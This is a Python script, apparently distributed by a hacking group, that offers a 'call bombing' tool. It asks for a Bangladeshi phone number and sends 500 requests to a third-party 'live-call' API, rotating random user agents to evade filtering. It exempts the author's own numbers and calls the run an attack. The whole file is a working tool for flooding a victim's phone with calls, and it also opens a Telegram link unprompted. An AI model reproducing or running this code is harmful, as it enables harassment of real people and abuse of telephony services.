import os
import sys
import time
import random
import requests
import re

# ANSI Color Codes for Styling
GREEN = "\033[92m"
BOLD = "\033[1m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"

# Restricted Numbers Blacklist (Normalized formats)
RESTRICTED_NUMBERS = {
    "01845483964",
    "01613950781"
}

def normalize_number(phone_input):
    digits_only = re.sub(r'\D', '', phone_input)
    if digits_only.startswith("880") and len(digits_only) == 13:
        digits_only = "0" + digits_only[3:]
    return digits_only

def banner():
    os.system("clear")
    banner_text = f"""
{GREEN}{BOLD}
  ____  _                         ____      _ _ 
/ ___|| |__  _   ___   _____    / ___|__ _| | |
\___ \| '_ \| | | \ \ / / _ \  | |   / _` | | |
 ___) | | | | |_| |\ V / (_) | | |__| (_| | | |
|____/|_| |_|\__,_| \_/ \___/   \____\__,_|_|_|  
                                      
  {CYAN}S H U V O. D I P   C Y B E R   T E A M{RESET}
{GREEN}{BOLD}========================================={RESET}
{YELLOW}{BOLD} DEVELOPER  :{RESET} {BOLD}SHUVODIP KING{RESET}
{YELLOW}{BOLD} TELEGRAM   :{RESET} {BOLD}SHUVOX CYBER TEAM{RESET}
{YELLOW}{BOLD} TOOL       :{RESET} {BOLD}Bangladesh Called VS / 0.1{RESET}
{YELLOW}{BOLD} STATUS     :{RESET} {BOLD}FREE{RESET}
{GREEN}{BOLD}========================================={RESET}
"""
    print(banner_text)

def welcome_sequence():
    banner()
    os.system("espeak 'Welcome to Shuvo  Cyber X Called Tool'")
    print(f"{GREEN}{BOLD}[+] Joining our Telegram Channel...{RESET}")
    time.sleep(1.5)
    os.system("xdg-open https://t.me/shuvodipjrp")
    time.sleep(2)

def get_random_user_agent():
    desktop_browsers = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66"
    ]
    mobile_browsers = [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.143 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 12; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.193 Mobile Safari/537.36"
    ]
    os_platforms = ["Windows NT 10.0", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64", "iPhone; CPU iPhone OS 17_0 like Mac OS X", "Linux; Android 13"]
    
    base_ua = random.choice(desktop_browsers + mobile_browsers)
    rand_ver = f"{random.randint(110, 125)}.0.{random.randint(1000, 9999)}.{random.randint(10, 99)}"
    
    unlimited_user_agents = [
        base_ua,
        f"Mozilla/5.0 ({random.choice(os_platforms)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{rand_ver} Safari/537.36",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{rand_ver} Safari/537.36 Edg/{rand_ver}",
        f"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:{random.randint(115, 123)}.0) Gecko/20100101 Firefox/{random.randint(115, 123)}.0"
    ]
    return random.choice(unlimited_user_agents)

def loading_animation(text):
    print(f"\n{GREEN}{BOLD}", end="")
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.04)
    print(f"{RESET}")

def start_bombing(phone_number):
    normalized = normalize_number(phone_number)
    
    if normalized in RESTRICTED_NUMBERS:
        print(f"\n{RED}{BOLD}Baper Sathe Ablami Koris Na! I'm a ShuvoDip your boss.{RESET}")
        return

    url = f"https://api-modifyxhub.tech/custom.php?api_action=live-call&number={phone_number}"
    
    loading_animation("[*] Initializing Secure Dispatcher...")
    time.sleep(1)
    
    success_count = 0
    
    print(f"\n{GREEN}{BOLD}[+] Target Number: {phone_number}{RESET}")
    print(f"{GREEN}{BOLD}[+] Executing 500 Requests with Unlimited Random User-Agents...\n{RESET}")
    
    for i in range(1, 501):
        headers = {
            "User-Agent": get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive"
        }
        
        try:
            requests.get(url, headers=headers, timeout=8)
            success_count += 1
            print(f"{GREEN}{BOLD}[FUCKING-SUCCESS] Call Request Sent Successfully!{RESET}")
        except Exception:
            pass
        
        time.sleep(random.uniform(1.0, 2.0))
        
    print(f"\n{GREEN}{BOLD}========================================={RESET}")
    print(f"{GREEN}{BOLD} [✓] Attack Finished Successfully!{RESET}")
    print(f"{GREEN}{BOLD} [✓] Total Dispatched : {success_count}{RESET}")
    print(f"{GREEN}{BOLD}========================================={RESET}")

def main():
    welcome_sequence()
    while True:
        banner()
        print(f"{CYAN}{BOLD} [1] Start Call Bombing{RESET}")
        print(f"{CYAN}{BOLD} [2] Join Telegram Channel{RESET}")
        print(f"{CYAN}{BOLD} [3] Exit Tool{RESET}")
        
        choice = input(f"\n{GREEN}{BOLD} ==>> Choose Option: {RESET}").strip()
        
        if choice == "1":
            phone = input(f"{GREEN}{BOLD} Enter Fuck Phone Number (Ex: 017xxx...SEX): {RESET}").strip()
            if len(phone) >= 10:
                start_bombing(phone)
                input(f"\n{YELLOW}{BOLD}Press Enter to go back to Menu...{RESET}")
            else:
                print(f"{RED}{BOLD}[!] Invalid Number! Try again.{RESET}")
                time.sleep(1.5)
        elif choice == "2":
            os.system("xdg-open https://t.me/shuvodipjrp")
        elif choice == "3":
            print(f"{GREEN}{BOLD} Thank you for using ShuvoDipX Cyber Tools!{RESET}")
            sys.exit()
        else:
            print(f"{RED}{BOLD}[!] Invalid Choice! Please select 1, 2, or 3.{RESET}")
            time.sleep(1.5)

if __name__ == "__main__":
    main()
